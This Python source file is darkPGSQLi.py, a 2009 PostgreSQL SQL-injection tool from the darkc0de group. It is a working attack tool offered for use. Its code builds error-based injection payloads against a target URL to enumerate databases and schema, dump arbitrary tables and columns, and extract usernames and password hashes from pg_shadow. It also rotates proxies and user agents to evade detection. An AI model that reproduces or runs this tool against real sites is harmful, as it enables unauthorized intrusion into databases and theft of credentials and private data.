#!/usr/bin/python
#     28/05/09             d3ck4, hacking.expose@gmail.com
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################
# Multi-Purpose PostgreSQL Injection Tool
# FUNCTIONS
#  *error base using cast to integer method (default method n happy with it!)
#  *refer: http://hackingexpose.blogspot.com/2009/04/postgresql-error-base-sql-injection.html
#  *full schema enumeration (current database only.. still research on it)
#  *table and column dump (current database only.. still research on it)
#  *database list extractor
#  *general info gathering

# UPCOMING (contribution is most welcome!)
#  *encode to CHR() to bypass quote escaping
#  *full schema enumeration on other database
#  *table n column dump on other database
#  *blind injection support
#  *load file and copy to
#  *shell exec
#  *--update / --drop / --create / etc..

# FEATURES
#  *Round Robin Proxy w/ a proxy list (non-auth or auth proxies)
#  *Proxy Auth (works great with Squid w/ basic auth)
#  *Random browser agent chosen everytime the script runs
#  *debug mode for seeing every URL request, proxy used, browser agent used

# darkc0de Crew 
# www.darkc0de.com 
# d3ck4, hacking.expose[at]gmail[dot]com

# big credit goes to rsauron, rsauron@gmail.com.
# for the beautiful c0de of darkMySQLi & darkMSSQLi
# d3hydr8 and all the darkc0de cr3w 
 
# Share the c0de!

import urllib, sys, re, os, socket, httplib, urllib2, time, random

##Set default evasion options here
arg_end = "--" # examples "--", "/*", "#", "%00", "--&SESSIONID=00hn3gvs21lu5ke2f03bxr" <-- if you need vars after inj point
arg_eva = "+" # examples "/**/" ,"+", "%20"
## colMax variable for column Finder
colMax = 200
## Set the default timeout value for requests
socket.setdefaulttimeout(30)
## Default Log File Name
logfile = "darkPGSQLi.log"
## Agents
agents = ["Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
	"Microsoft Internet Explorer/4.0b1 (Windows 95)",
	"Opera/8.00 (Windows NT 5.1; U; en)"]

#URL Get Function
def GetThatShit(head_URL):
        source = ""
        global gets;global proxy_num
        head_URL = head_URL.replace("+",arg_eva)
        request_web = urllib2.Request(head_URL)
        request_web.add_header('User-Agent',agent)
        while len(source) < 1:
                if arg_debug == "on":
                        print "\n[proxy]:",proxy_list_count[proxy_num % proxy_len]+"\n[agent]:",agent+"\n[debug]:",head_URL,"\n"
                try:
                        gets+=1;proxy_num+=1
                        source = proxy_list[proxy_num % proxy_len].open(request_web).read()
                except (KeyboardInterrupt, SystemExit):
                        raise
                except (urllib2.HTTPError):
                        print "[-] Unexpected error:", sys.exc_info()[0],"\n[-] Trying again!"
                        print "[proxy]:",proxy_list_count[proxy_num % proxy_len]+"\n[agent]:",agent+"\n[debug]:",head_URL,"\n"
                        break
                except:
                        print "[-] Unexpected error:", sys.exc_info()[0],"\n[-] Look at the error and try to figure it out!"
                        print "[proxy]:",proxy_list_count[proxy_num % proxy_len]+"\n[agent]:",agent+"\n[debug]:",head_URL,"\n"
                        raise
        return source
    
#say hello
if len(sys.argv) <= 1:
        print "\n|-------------------------------------------------|"
        print "| d3ck4, hacking.expose@gmail.com           v1.0  |"
        print "|                                                 |"
        print "|   05/2009        darkPGSQLi.py                  |"
        print "|  -- Multi Purpose PostgreSQL Injection Tool --  |"
        print "| Usage: darkPGSQLi.py [options]                  |"
        print "|        -h help       hackingexpose.blogspot.com |"
        print "|                                                 |"
        print "| credit: rsauron, d3hydr8 @ darkc0de.com         |"
        print "| greet: Hacking Expose!, darkc0de, HMSecurity    |"
        print "| shout: vex, xum4r1x, cr4y0n, ./gmie, z4w3p      |"
        print "|-------------------------------------------------|\n"
        sys.exit(1)

#help option
for arg in sys.argv:
        if arg == "-h" or arg == "--help":
                print "\ndarkPGSQLi v1.0      d3ck4, hacking.expose@gmail.com\n"
                print "Usage: ./darkPGSQLi.py [options]"
                print "Options:"
                print "  -h, --help           shows this help message and exits"
                print "  -d, --debug          display URL debug information\n"
                print "  Target:"
                print "    -u URL, --url=URL  Target url\n"
                print "                       eg: http://www.site.com/index.php?id=1\n"
                print "  Modes:"
                print "    --dbs              Enumerate databases"
                print "    --schema           Enumerate schema (opt: -T)"
                print "    --info             PostgreSQL Server configuration"
                print "    --dump             Dump database table entries (req: -T,"
                print "                       opt: -C, --start, --where)"
                print "  Define:"
#                print "    -D DB              database to enumerate"
                print "    -T TBL             table to enumerate"
                print "    -C COL             column to enumerate"
                print "  Optional:"
                print "    --ssl              To use SSL"
                print "    --end              To use   +  and -- for the URLS --end \"--\" (Default)"
                print "                       To use /**/ and /* for the URLS --end \"/*\""
                print "    --rowdisp          Do not display row # when dumping"
                print "    --start [ROW]        Row number to begin dumping at"
                print "    --where [COL,VALUE]  Use a where clause in your dump"
                print "    --orderby [COL]      Use a orderby clause in your dump"
                print "    --cookie [FILE.TXT]  Use a Mozilla cookie file"
                print "    --proxy [PROXY]      Use a HTTP proxy to connect to the target url"
                print "    --output [FILE.TXT]  Output results of tool to this file\n"
                sys.exit(1)

#define variables
site = ""
proxy = "None"
arg_string = ""
arg_table = "None"
#arg_database = "None"
arg_columns = "None"
arg_row = "Rows"
arg_cookie = "None"
arg_insert = "None"
arg_where = ""
arg_orderby = ""
arg_debug = "off"
arg_rowdisp = 1
arg_adminusers = 10
arg_wordlist = ""
arg_ssl = "off"
arg_proxy_auth = ""
darkc0de = "SELECT+CHR(35)||CHR(35)||"
mode = "None"
lower_bound = 0
upper_bound = 16069
line_URL = ""
count_URL = ""
cur_db = ""
cur_table = ""
terminal = ""
count = 0
gets = 0
table_num = 0
num = 0
ser_ver = 3
version =[]
let_pos = 1
lim_num = 0
agent = ""

#Check args
for arg in sys.argv:
	if arg == "-u" or arg == "--url":
		site = sys.argv[count+1]
	elif arg == "--output":
		logfile = sys.argv[count+1]
	elif arg == "--proxy":
		proxy = sys.argv[count+1]
        elif arg == "--proxyauth":
                arg_proxy_auth = sys.argv[count+1]
	elif arg == "--dump":
                mode = arg;arg_dump = sys.argv[count]
        elif arg == "--schema":
                mode = arg;arg_schema = sys.argv[count]
        elif arg == "--dbs":
                mode = arg;arg_dbs = sys.argv[count]
        elif arg == "--info":
                mode = arg;arg_info = sys.argv[count] 
        elif arg == "--cookie":
                arg_cookie = sys.argv[count+1]
        elif arg == "--ssl":
                arg_ssl = "on"
#	elif arg == "-D":
#		arg_database = sys.argv[count+1]
	elif arg == "-T":
		arg_table = sys.argv[count+1]
	elif arg == "-C":
		arg_columns = sys.argv[count+1]
	elif arg == "--start":
                num = int(sys.argv[count+1]) - 1
                table_num = num 
        elif arg == "-d" or arg == "--debug":
                arg_debug = "on"
        elif arg == "--where":
                arg_where = sys.argv[count+1]
        elif arg == "--orderby":
                arg_orderby = sys.argv[count+1]
        elif arg == "--rowdisp":
                arg_rowdisp = sys.argv[count]
                arg_rowdisp = 0
	elif arg == "--end":
                arg_end = sys.argv[count+1]
                if arg_end == "--":
                        arg_eva = "+"
                else:
                        arg_eva = "/**/"
	count+=1

#Title write
file = open(logfile, "a")
print "\n|-------------------------------------------------|"
print "| d3ck4, hacking.expose@gmail.com            v1.0 |"
print "|                                                 |"
print "|   05/2009        darkPGSQLi.py                  |"
print "|  -- Multi Purpose PostgreSQL Injection Tool --  |"
print "| Usage: darkPGSQLi.py [options]                  |"
print "|        -h help       hackingexpose.blogspot.com |"
print "|                                                 |"
print "| credit: rsauron, d3hydr8 @ darkc0de.com         |"
print "| greet: Hacking Expose!, darkc0de, HMSecurity    |"
print "| shout: vex, xum4r1x, cr4y0n, ./gmie, z4w3p      |"
print "|-------------------------------------------------|\n"

#Arg Error Checking
#if mode == "None":
#        print "[-] Mode is required!\n[-] Need Help? --help\n"
#        sys.exit(1)
if mode != "None" and arg == "-u" and site == "":
        print "[-] URL is required!\n[-] Need Help? --help\n"
        print "[!] eg: http://www.site.com/index.php?id=1\n"
        sys.exit(1)

if mode == "--dump":
        if arg_table == "None" or arg_columns == "None":
                print "[-] Must include -T and -C flag.\n[-] Need Help? --help\n"
                sys.exit(1)
if proxy != "None":
        if len(proxy.split(".")) == 2:
                proxy = open(proxy, "r").read()
        if proxy.endswith("\n"):
                proxy = proxy.rstrip("\n")
        proxy = proxy.split("\n")
if arg_ssl == "off":
        if site[:4] != "http": 
                site = "http://"+site
else:
        if site[:5] != "https":
                site = "https://"+site
if site.endswith("/*"):
	site = site.rstrip('/*')
if site.endswith("--"):
	site = site.rstrip('--')
if arg_cookie != "None":
        try:
                cj = cookielib.MozillaCookieJar()
                cj.load(arg_cookie)
                cookie_handler = urllib2.HTTPCookieProcessor(cj)
        except:
                print "[!] There was a problem loading your cookie file!"
                print "[!] Make sure the cookie file is in Mozilla Cookie File Format!"
                print "[!] http://xiix.wordpress.com/2006/03/23/mozillafirefox-cookie-format/\n"
                sys.exit(1)
else:
        cookie_handler = urllib2.HTTPCookieProcessor()

if arg_columns != "None":
        arg_columns = arg_columns.split(",")
if arg_insert != "None":
        arg_insert = arg_insert.split(",")
agent = random.choice(agents)

file.write("\n|-------------------------------------------------|")
file.write("\n| d3ck4, hacking.expose@gmail.com           v1.0  |")
file.write("\n|                                                 |")
file.write("\n|   5/2009      darkPGSQLi.py                     |")
file.write("\n|  -- Multi Purpose PostgreSQL Injection Tool --  |")
file.write("\n| Usage: darkPGSQLi.py [options]                  |")
file.write("\n|        -h help      hackingexpose.blogspot.com  |")
file.write("\n|                                                 |")
file.write("\n| credit: rsauron, d3hydr8 @ darkc0de.com         |")
file.write("\n| greet: Hacking Expose!, darkc0de, HMSecurity    |")
file.write("\n| shout: vex, xum4r1x, cr4y0n, ./gmie, z4w3p      |")
file.write("\n|-------------------------------------------------|")

#General Info
print "[+] URL:",site;file.write("\n\n[+] URL: "+site)
print "[+] %s" % time.strftime("%X");file.write("\n[+] %s" % time.strftime("%X"))
print "[+] Evasion:",arg_eva,arg_end;file.write("\n[+] Evasion: "+arg_eva+" "+arg_end)
print "[+] Cookie:", arg_cookie;file.write("\n[+] Cookie: "+arg_cookie)
if site[:5] == "https":
        print "[+] SSL: Yes";file.write("\n[+] SSL: Yes")
else:
        print "[+] SSL: No";file.write("\n[+] SSL: No")
print "[+] Agent:",agent;file.write("\n[+] Agent: "+agent)
        
#Build proxy list
proxy_list = [];proxy_list_count = []
if proxy != "None":
	print "[+] Building Proxy List...";file.write("\n[+] Building Proxy List...")
	for p in proxy: 
		try:
                        match = re.findall(":",p)
                        if len(match) == 3:
                                arg_proxy_auth = []
                                prox = p.split(":")
                                arg_proxy_auth += prox
                        if arg_proxy_auth != "":
                                proxy_auth_handler = urllib2.HTTPBasicAuthHandler()
                                proxy_auth_handler.add_password("none",p,arg_proxy_auth[2],arg_proxy_auth[3])
                                opener = urllib2.build_opener(proxy_auth_handler)
                                opener.open("http://www.google.com")
                                proxy_list.append(urllib2.build_opener(proxy_auth_handler, cookie_handler))
                                proxy_list_count.append(p);arg_proxy_auth = ""
                        else:
                                proxy_handler = urllib2.ProxyHandler({'http': 'http://'+p+'/'})
                                opener = urllib2.build_opener(proxy_handler)
                                opener.open("http://www.google.com")
                                proxy_list.append(urllib2.build_opener(proxy_handler, cookie_handler))
                                proxy_list_count.append(p)
                        if len(match) == 3 or len(match) == 1:
                                print "\tProxy:",p,"- Success";file.write("\n\tProxy:"+p+" - Success")
                        else:
                                print "\tProxy:",p,arg_proxy_auth[2]+":"+arg_proxy_auth[3]+"- Success";file.write("\n\tProxy:"+p+" - Success")
		except:
			print "\tProxy:",p,"- Failed [ERROR]:",sys.exc_info()[0];file.write("\n\tProxy:"+p+" - Failed [ERROR]: "+str(sys.exc_info()[0]))
			pass
	if len(proxy_list) == 0:
		print "[-] All proxies have failed. App Exiting"
		sys.exit(1) 
	print "[+] Proxy List Complete";file.write("\n[+] Proxy List Complete")
else:
	print "[-] Proxy Not Given";file.write("\n[+] Proxy Not Given")
	proxy_list.append(urllib2.build_opener(cookie_handler))
        proxy_list_count.append("None")
proxy_num = 0
proxy_len = len(proxy_list)

#Retrieve version:user:database
if mode != "":
        site = site+"+AND+1=cast((darkc0de)+as+int)"
        head_URL = site.replace("darkc0de","CHR(35)||CHR(45)||CHR(35)||version()||CHR(35)||CHR(35)||current_user||CHR(35)||current_database()||CHR(35)||CHR(58)")+arg_end
        print "[+] Gathering PostgreSQL Server Configuration...";file.write("\n[+] Gathering PostgreSQL Server Configuration...\n")
        source = GetThatShit(head_URL)
        match = re.findall("\x23\x23\S+",source)
        match2 = re.findall("#-#([^>]+?)##",source)
        if len(match) >= 1: 
                match = match[0][0:].split("\x23")
                version = match2[0]
                user = match[2]
                database = match[3]
                print "\nDatabase:", database;file.write("\n\tDatabase: "+database+"\n")
                print "User:", user;file.write("\tUser: "+user+"\n")
                print "Version:", version,"\n";file.write("\tVersion: "+version+"\n")
        else:
                print "\n[-] There seems to be a problem with your URL. Please check and try again.\n[DEBUG]:",head_URL.replace("+",arg_eva),"\n"
                sys.exit(1)

# Mode --info
if mode == "--info":
        head_URL = site.replace("darkc0de","SELECT+CHR(100)||CHR(97)||CHR(114)||CHR(107)||CHR(99)||CHR(48)||CHR(100)||CHR(101)+FROM+pg_shadow")+arg_end
        source = GetThatShit(head_URL)
        match = re.findall("darkc0de",source)
        if len(match) >= 1:
                yesno = "YES <-- w00t w00t"
        else:
                yesno = "NO"
        print "\n[+] Do we have Access to PostgreSQL Database:",yesno;file.write("\n\n[+] Do we have Access to PostgreSQL Database: "+str(yesno))
        if yesno == "YES <-- w00t w00t":
                print "\n[+] Dumping PostgreSQL user info. user:password";file.write("\n\n[+] Dumping PostgreSQL user info. user:password")
                head_URL = site.replace("darkc0de","SELECT+CHR(35)||CHR(35)||COUNT(*)||CHR(35)||CHR(58)+FROM+pg_shadow")+arg_end
                source = GetThatShit(head_URL)
                match = re.findall("\x23\x23\S+",source);match = match[0].strip("\x23").split("\x23");userend = match[0]
                print "[+] Number of usename in the pg_shadow table:",userend;file.write("[+] Number of usename in the pg_shadow table: "+str(userend))
                head_URL = site.replace("darkc0de","SELECT+CHR(35)||CHR(35)||usename||CHR(35)||passwd||CHR(35)||CHR(58)+FROM+pg_shadow+LIMIT+1+OFFSET+NUM")+arg_end
                for x in range(0,int(userend)):
                        try: 
                                source = GetThatShit(head_URL.replace("NUM",str(x)))
                                match = re.findall("\x23\x23\S+",source)
                                match = match[0].strip("\x23").split("\x23")
                                if len(match) != 3:
                                        nullvar = "NULL"
                                        match += nullvar
                                print "\t["+str(x)+"]",match[0]+":"+match[1]+":"+match[2];file.write("\n["+str(x)+"] "+str(match[0])+":"+str(match[1])+":"+str(match[2]))
                        except (KeyboardInterrupt, SystemExit):
                                raise
                        except:
                                pass
        else:
                print "\n[-] PostgreSQL user enumeration has been skipped!\n[-] We do not have access to PostgreSQL DB on this target!"
                file.write("\n\n[-] PostgreSQL user enumeration has been skipped!\n[-] We do not have access to PostgreSQL DB on this target!")

#Build URLS for each different mode
if mode == "--schema":
	if arg_table == "None":
		
                        print "[+] Showing Tables & Columns from current database"
                        file.write("\n[+] Showing Tables & Columns from current database")
                        line_URL = site.replace("darkc0de","SELECT+CHR(35)||CHR(35)||current_database()||CHR(35)||relname||CHR(35)||attname||CHR(35)||CHR(58)+FROM+pg_class+C,+pg_namespace+N,+pg_attribute+A,+pg_type+T+WHERE+(C.relkind=CHR(114))+AND+(N.oid=C.relnamespace)+AND+(A.attrelid=C.oid)+AND+(A.atttypid=T.oid)+AND+(A.attnum>0)+AND+(NOT+A.attisdropped)+AND+(N.nspname+ILIKE+CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99))+LIMIT+1+OFFSET+NUM")+arg_end
                        count_URL = site.replace("darkc0de","SELECT+CHR(35)||CHR(35)||COUNT(relname)||CHR(35)||CHR(58)+FROM+pg_catalog.pg_class+c+LEFT+JOIN+pg_catalog.pg_namespace+n+ON+n.oid=c.relnamespace+WHERE+c.relkind+IN+(CHR(114),NULL)+AND+n.nspname+NOT+IN+(CHR(112)||CHR(103)||CHR(95)||CHR(99)||CHR(97)||CHR(116)||CHR(97)||CHR(108)||CHR(111)||CHR(103),+CHR(112)||CHR(103)||CHR(95)||CHR(116)||CHR(111)||CHR(97)||CHR(115)||CHR(116))+AND+pg_catalog.pg_table_is_visible(c.oid)")+arg_end
        arg_row = "Tables"
        if arg_table != "None":
                        print "[+] Showing Columns from Database current database and Table \""+arg_table+"\""
                        print "\n[!] This features only working when \"magic quote is off\" on target"
                        file.write("\n[+] Showing Columns from current database and Table \""+arg_table+"\"")
                        line_URL = site.replace("darkc0de","SELECT+CHR(35)||CHR(35)||current_database()||CHR(35)||relname||CHR(35)||attname||CHR(35)||CHR(58)+FROM+pg_class+C,+pg_namespace+N,+pg_attribute+A,+pg_type+T+WHERE+(C.relkind=CHR(114))+AND+(N.oid=C.relnamespace)+AND+(A.attrelid=C.oid)+AND+(A.atttypid=T.oid)+AND+(A.attnum>0)+AND+(NOT+A.attisdropped)+AND+(N.nspname+ILIKE+CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99))+AND+relname+=+\'"+arg_table+"\'+LIMIT+1+OFFSET+NUM")+arg_end
                        count_URL = site.replace("darkc0de","SELECT+CHR(35)||CHR(35)||COUNT(attname)||CHR(35)||CHR(58)+FROM+pg_class+C,+pg_namespace+N,+pg_attribute+A,+pg_type+T+WHERE+(C.relkind=CHR(114))+AND+(N.oid=C.relnamespace)+AND+(A.attrelid=C.oid)+AND+(A.atttypid=T.oid)+AND+(A.attnum>0)+AND+(NOT+A.attisdropped)+AND+(N.nspname+ILIKE+CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99))+AND+relname+=+\'"+arg_table+"\'+LIMIT+1+OFFSET+NUM")+arg_end
		        arg_row = "Columns"

elif mode == "--dump":                
	print "[+] Dumping data from current database and Table \""+str(arg_table)+"\""
	file.write("\n[+] Dumping data from current database and Table \""+str(arg_table)+"\"")
        print "[+] and Column(s) "+str(arg_columns);file.write("\n[+] Column(s) "+str(arg_columns))
        for column in arg_columns:
                darkc0de += column+"||CHR(35)||"
                count_URL = site.replace("darkc0de","SELECT+CHR(35)||CHR(35)||COUNT(*)||CHR(35)||CHR(58)+FROM+"+arg_table)+arg_end
                line_URL = site.replace("darkc0de",darkc0de+"CHR(35)||CHR(58)+FROM+"+arg_table+"+LIMIT+1+OFFSET+NUM")+arg_end
        if arg_where != "" or arg_orderby != "":
                if arg_where != "":
                        arg_where = arg_where.split(",")
                        print "[+] WHERE clause:","\""+arg_where[0]+">"+arg_where[1]+"\""
                        arg_where = "WHERE+"+arg_where[0]+">"+arg_where[1]
                if arg_orderby != "":
                        arg_orderby = "ORDER+BY+'"+arg_orderby+"'"
                        print "[+] ORDERBY clause:",arg_orderby
                count_URL = site.replace("darkc0de","SELECT+CHR(35)||CHR(35)||COUNT(*)||CHR(35)||CHR(58)+FROM+"+arg_table+"+"+arg_where)+arg_end
                line_URL = site.replace("darkc0de",darkc0de+"CHR(35)||CHR(58)+FROM+"+arg_table+"+"+arg_where+"+"+arg_orderby+"+LIMIT+1+OFFSET+NUM")+arg_end
		
elif mode == "--dbs":
	print "[+] Showing all databases current user has access too!"
	file.write("\n[+] Showing all databases current user has access too!")
        count_URL = site.replace("darkc0de","SELECT+CHR(35)||CHR(35)||COUNT(datname)||CHR(35)||CHR(58)+FROM+pg_database")+arg_end
        line_URL = site.replace("darkc0de","SELECT+CHR(35)||CHR(35)||datname||CHR(35)||CHR(58)+FROM+pg_database+LIMIT+1+OFFSET+NUM")+arg_end
	arg_row = "Databases"

        #count_URL += arg_end

#Lets Count how many rows or columns
if mode == "--schema" or mode == "--dump" or mode == "--dbs":
        source = GetThatShit(count_URL)
        match = re.findall("\x23\x23\S+",source)
        match = match[0][2:].split("\x23")
        row_value = match[0]
        print "[+] Number of "+arg_row+": "+str(row_value);file.write("\n[+] Number of "+arg_row+": "+str(row_value)+"\n")

## UNION Schema Enumeration and DataExt loop
        if mode == "--schema" or mode == "--dump" or mode == "--dbs":
                while int(table_num) != int(row_value):
                        try:
                                source = GetThatShit(line_URL.replace("NUM",str(num)))
                                match = re.findall("\x23\x23\S+",source)
                                match2 = re.findall("##([^>]+?)#:",source)
                                if len(match) >= 1:
                                        if mode == "--schema":
                                                match = match[0][2:].split("\x23")
                                                if cur_db != match[0]:			
                                                        cur_db = match[0]
                                                        if table_num == 0:
                                                                print "\n[Database]: "+match[0];file.write("\n[Database]: "+match[0]+"\n")
                                                        else:
                                                                print "\n\n[Database]: "+match[0];file.write("\n\n[Database]: "+match[0]+"\n")
                                                        print "[Table: Columns]";file.write("[Table: Columns]\n")
                                                if cur_table != match[1]:
                                                        print "\n["+str(table_num+1)+"]"+match[1]+": "+match[2],
                                                        file.write("\n["+str(table_num+1)+"]"+match[1]+": "+match[2])
                                                        cur_table = match[1]
                                                        #table_num+=1
                                                        table_num = int(table_num) + 1
                                                else:
                                                        sys.stdout.write(",%s" % (match[2]))
                                                        file.write(","+match[2])
                                                        sys.stdout.flush()
                                        #Gathering list of Databases only
                                        elif mode == "--dbs":                                        
                                                match = match2[0]
                                                if table_num == 0:
                                                        print "\n["+str(num+1)+"]",match;file.write("\n["+str(num+1)+"]"+str(match))
                                                else:
                                                        print "["+str(num+1)+"]",match;file.write("\n["+str(num+1)+"]"+str(match))
                                                table_num+=1
                                        #Collect data from tables & columns
                                        elif mode == "--dump":
                                                match = re.findall("\x23\x23+.+\x23\x23",source)
                                                if match == []:
                                                        match = ['']
                                                else:
                                                        match = match[0].strip("\x23").split("\x23")
                                                if arg_rowdisp == 1:
                                                        print "\n["+str(num+1)+"] ",;file.write("\n["+str(num+1)+"] ",)
                                                else:
                                                        print;file.write("\n")
                                                for ddata in match:
                                                        if ddata == "":
                                                                ddata = "NoDataInColumn"
                                                        sys.stdout.write("%s:" % (ddata))
                                                        file.write("%s:" % ddata)
                                                        sys.stdout.flush()
                                                table_num+=1
                                else:
                                        if mode == "--dump":
                                                table_num+=1
                                                sys.stdout.write("\n[%s] No data" % (num))
                                                file.write("\n[%s] No data" % (num))
                                        break
                                num+=1
                        except (KeyboardInterrupt, SystemExit):
                                raise
                        except:
                                pass

#Lets wrap it up!
if mode == "--schema" or mode == "--dump":
        print "\n\n[-] %s" % time.strftime("%X");file.write("\n\n[-] [%s]" % time.strftime("%X"))
else:
        print "\n[-] %s" % time.strftime("%X");file.write("\n\n[-] [%s]" % time.strftime("%X"))
print "[-] Total URL Requests:",gets;file.write("\n[-] Total URL Requests: "+str(gets))
print "[-] Done\n";file.write("\n[-] Done\n")
print "Don't forget to check", logfile,"\n"
file.close()
